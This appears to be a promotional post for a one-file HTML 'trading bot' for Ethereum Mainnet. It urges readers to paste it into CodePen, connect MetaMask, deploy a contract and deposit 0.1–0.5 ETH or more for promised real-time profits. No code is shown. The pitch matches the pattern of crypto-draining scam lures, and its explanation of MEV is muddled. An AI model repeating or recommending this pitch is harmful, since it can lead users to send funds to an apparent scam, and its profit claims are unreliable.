Hey crypto enthusiasts! I’m excited to share my **Local Trading Bot** — a simple tool for real trading on the **Ethereum Mainnet**. Everything is packed in **one HTML file**, so you can run it directly on **CodePen** with zero hassle! 😎 The interface is inspired by VS Code — clean and intuitive — perfect for trading straight from your browser. Here’s how it works!

## Features

- **All-in-One File**: The entire code is in one HTML file — just copy, paste it into CodePen, and you’re ready to go!
- **Wallet Connection**: Easily connect your MetaMask wallet to work with the smart contract.
- **Smart Contract Deployment**: Deploy your custom contract on Mainnet (you cover the gas fee).
- **Real Trading**: Start with a minimum of **0.1 ETH**, but for better results, **0.5 ETH+** is recommended — hit "**Start**" and watch it trade.
- **Slippage Control**: Adjust slippage tolerance between **0.5% and 49%** for flexible trades.
- **MEV Protection & Sniping**: Enable protection from Miner Extractable Value (MEV) attacks or automatic deal sniping.
  - **What is MEV?** MEV means other bots or miners can try to front-run your trades to capture your profit. MEV protection helps your transactions get ahead of competitors.
- **Workflow Control**:
  - **Start**: Launches the trading process (requires ≥0.1 ETH, confirm function call).
  - **Stop**: Stops the trading, available only after Start.
  - **Withdraw**: Withdraws funds, available only after Stop.
- **Real-Time Terminal**: Displays current transactions, trade paths, and profit.
- **Profit Potential**: Shows profitable trades and expected profit in real time (based on a **1 ETH** deposit).
- **Responsive Design**: Works perfectly on both desktop and mobile devices.
